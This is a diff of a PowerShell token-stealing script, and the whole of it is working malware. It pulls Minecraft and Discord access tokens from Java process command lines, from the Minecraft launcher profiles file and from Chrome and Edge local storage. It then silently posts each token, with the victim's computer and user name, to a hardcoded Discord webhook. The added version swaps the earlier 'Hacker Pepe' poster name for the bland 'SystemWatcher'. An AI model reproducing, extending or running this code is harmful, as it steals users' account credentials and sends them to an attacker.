@@ -1,80 +1,66 @@
-$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
+$webhook = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
+$computer = $env:COMPUTERNAME
+$user = $env:USERNAME
 
-# Check Java processes for Discord tokens
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'java%' AND CommandLine LIKE '%accessToken%'" | 
-Select-Object -ExpandProperty CommandLine | 
-ForEach-Object {
- $accessToken = $null
- $username = $null
-
- if ($_ -match '--accessToken\s+(\S+)') {
- $accessToken = $matches[1]
- }
- if ($_ -match '--username\s+(\S+)') {
- $username = $matches[1]
- }
-
- if ($accessToken -and $username) {
- # Format the message for Discord
- $message = @"
- > AccessToken: $accessToken 
- > Username: $username 
-"@
-
- Write-Output "Discord Token Found!"
- 
- # Properly format the payload for Discord
- $payload = @{
- content=null
- embeds=@(
- @{
- title="Discord Token"
- color=2067276
- fields=@(
- @{
- name="Access Token"
- value=$message.ToString()
- inline=$false
- },
- @{
- name="Stolen From"
- value=$env:COMPUTERNAME.ToString()
- inline=$true
- }
- )
- }
- )
- username="Hacker Pepe"
- avatar_url="https://imgur.com/5Ri5eok.png"
- }|ConvertTo-Json-D10
-
- # Send the payload to the Discord webhook 
- Invoke-RestMethod-Uri"$webhookUrl"-MethodPost-ConType"application/json"-Body($payload)
- }
+function Send-Discord {
+    param($title, $fields)
+    $body = @{
+        embeds = @(@{
+            title = $title
+            color = 0x1F8B4C
+            fields = $fields
+            footer = @{text = "From: $computer\$user"}
+        })
+        username = "SystemWatcher"
+    } | ConvertTo-Json -Depth 10
+    try { Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body -ErrorAction SilentlyContinue } catch {}
 }
 
-# Check Minecraft launcher profiles for access tokens (if applicable)
-$minecraftPath="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
+# Java Discord tokens
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" | ForEach-Object {
+    if ($_.CommandLine -match '--accessToken\s+(\S+)') {
+        $token = $matches[1]
+        $uname = if ($_.CommandLine -match '--username\s+(\S+)') { $matches[1] } else { "Unknown" }
+        Send-Discord "Discord Token (Java)" @(
+            @{name="Access Token"; value="```$token```"; inline=$false},
+            @{name="Username"; value=$uname; inline=$true}
+        )
+    }
+}
 
-if (Test-Path "$minecraftPath") {  
-  try {  
- Import-Csv "$minecraftPath" | ForEach-Object {  
- if ($_.properties.accessToken) {  
- Write-Output "Minecraft Access Token Found!"  
+# Minecraft tokens
+$mcPath = "C:\Users\$user\AppData\Roaming\.minecraft\launcher_profiles.json"
+if (Test-Path $mcPath) {
+    try {
+        $mcData = Get-Content $mcPath -Raw | ConvertFrom-Json
+        $token = $mcData.accessToken
+        if ($token) {
+            Send-Discord "Minecraft Token" @(
+                @{name="Access Token"; value="```$token```"; inline=$false}
+            )
+        }
+    } catch {}
+}
 
- # Properly format the payload for Discord  
- $payloadToken=@{  
- content=null  
- embeds=@(  
- @{title="Minecraft Access Token";color=2067276;fields=(@{name='Access Token';value=$_.properties.accessToken.ToString();inline=$false},@{name='Profile Name';value=$_.name.ToString();inline=$true})} 
- ) 
- username="Hacker Pepe" 
- avatar_url="https://imgur.com/5Ri5eok.png" 
- }|ConvertTo-Json-D10  
-
- # Send the payload to the Discord webhook 
- Invoke-RestMethod-Uri"$webhookUrl"-MethodPost-ConType"application/json"-Body($payloadToken)
- } 
- } 
-  } catch {Write-Output("Error parsing Minecraft profiles file")} 
+# Browser Discord tokens
+$paths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+)
+$tokens = @()
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        Get-ChildItem "$p\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            $regex = '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}'
+            $matches = [regex]::Matches($c, $regex)
+            foreach ($m in $matches) { $tokens += $m.Value }
+        }
+    }
+}
+$tokens = $tokens | Select-Object -Unique
+foreach ($t in $tokens) {
+    Send-Discord "Discord Token (Browser)" @(
+        @{name="Token"; value="```$t```"; inline=$false}
+    )
 }
